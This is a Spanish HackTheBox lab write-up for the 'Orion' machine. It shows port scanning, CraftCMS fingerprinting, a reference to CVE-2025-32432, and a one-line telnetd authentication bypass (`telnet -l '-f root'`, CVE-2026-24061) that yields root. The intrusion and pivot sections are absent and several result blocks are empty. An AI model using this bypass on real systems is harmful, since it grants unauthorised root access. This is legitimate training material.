#

Writeup: Orion (HackTheBox)
#

Orion es una máquina de dificultad Easy de la plataforma HackTheBox. La resolución de esta máquina involucra:

  1. Reconocimiento: Identificación de puertos abiertos (22/SSH, 80/HTTP) y enumeración del CMS CraftCMS y el framework Yii.
  2. Intrusión: Explotación de una vulnerabilidad de ejecución remota de comandos pre-autenticada (RCE) en CraftCMS (CVE-2025-32432).
  3. Pivote: Extracción de credenciales de base de datos desde el archivo .env, volcado del hash bcrypt del usuario adam y craqueo mediante fuerza bruta con Hashcat.
  4. Escalada de Privilegios: Explotación de una vulnerabilidad de bypass de autenticación en el daemon local telnetd (CVE-2026-24061) para obtener acceso como root.

1. Fase de Reconocimiento (Reconnaissance)
#

Comprobación de Conectividad (Ping)
#

Realizamos un ping rápido para confirmar que el host está activo y para deducir el sistema operativo mediante el TTL (Time To Live).

ping -c1 10.129.45.196

Resultado:

PING 10.129.45.196 (10.129.45.196) 56(84) bytes of data.
64 bytes from 10.129.45.196: icmp_seq=1 ttl=63 time=76.0 ms

--- 10.129.45.196 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms

[!NOTE] El valor de TTL = 63 sugiere que el objetivo es una máquina basada en Linux (el TTL inicial suele ser 64 y se decrementa en 1 por el salto de red).

Escaneo de Puertos y Servicios (Nmap)
#

Descubrimiento de Puertos Abiertos
#

Lanzamos un escaneo rápido para descubrir puertos TCP abiertos en todo el rango (65535).

nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.45.196 -oG nmap/allPorts -v

Resultado:

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Escaneo Detallado de Servicios
#

Escaneamos los puertos identificados para obtener información más detallada sobre los servicios y sus versiones.

nmap -p22,80 -sCV 10.129.45.196 -oN nmap/target

Resultado:

2. Análisis de la Aplicación Web
#

Configuración del Host Local
#

Asociamos la dirección IP del objetivo con el dominio orion.htb en /etc/hosts para que la resolución DNS funcione correctamente en nuestro navegador y herramientas de fuzzing.

echo -e "10.129.45.196\torion.htb" | sudo tee -a /etc/hosts

Identificación de Tecnologías (WhatWeb)
#

Ejecutamos whatweb para identificar las tecnologías utilizadas en el servidor web.

whatweb http://orion.htb

Resultado:

Hallazgos Clave
#

Tras la enumeración exhaustiva, recopilamos las siguientes versiones de software:

  • CraftCMS: 5.6.16
  • Yii Framework: 2.0.51
  • Servidor Web: Nginx 1.18.0

Investigando vulnerabilidades conocidas para CraftCMS en estas versiones, encontramos la existencia de un RCE Pre-auth catalogado como CVE-2025-32432, que afecta al manejo de transformaciones de imágenes (Image Transform).

5. Escalada de Privilegios (Privilege Escalation)
#

Auditoría del Servicio Telnetd
#

Analizamos el daemon de Telnet interno identificado anteriormente. Verificamos la versión instalada en el sistema mediante el gestor de paquetes:

adam@orion:~$ dpkg -l | grep netd

Resultado:

ii  inetutils-inetd                        2:2.2-2ubuntu0.2                                 amd64        internet super server
ii  update-inetd                           4.51                                             all          inetd configuration file updater

Investigando vulnerabilidades para la versión 2.2 de inetutils-inetd, encontramos que es vulnerable a dos fallos recientes de severidad crítica (CVSS 9.8) publicados en 2026:

  • CVE-2026-24061 (Bypass de Autenticación): Permite pasar el parámetro -f root a través de la variable de entorno de usuario. El servicio telnetd reenvía este argumento directamente al binario login (login -f root), lo cual salta la autenticación y otorga acceso inmediato como root sin solicitar contraseña.
  • CVE-2026-32746 (Buffer Overflow en LINEMODE SLC): Desbordamiento de búfer pre-autenticación en el manejador de caracteres de control de modo de línea (LINEMODE SLC), permitiendo ejecución remota de código (RCE) como root.

Dado que la versión instalada en la máquina es 2.2 (afectando a todas las versiones de inetutils inferiores o iguales a la 2.7), procedemos a explotar el bypass de autenticación por su simplicidad y efectividad inmediata.

Explotación de CVE-2026-24061 (Telnet Auth Bypass)
#

Ejecutamos el comando de conexión de Telnet hacia localhost (127.0.0.1) indicando el usuario -f root.

adam@orion:~$ telnet -a 127.0.0.1 -l '-f root'

Resultado:

Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.

Linux 5.15.0-177-generic (orion) (pts/3)
...
root@orion:~#

¡Obtenemos acceso exitoso e inmediato como el usuario administrador máximo (root)!

Leemos el archivo correspondiente en el directorio de root para finalizar la máquina:
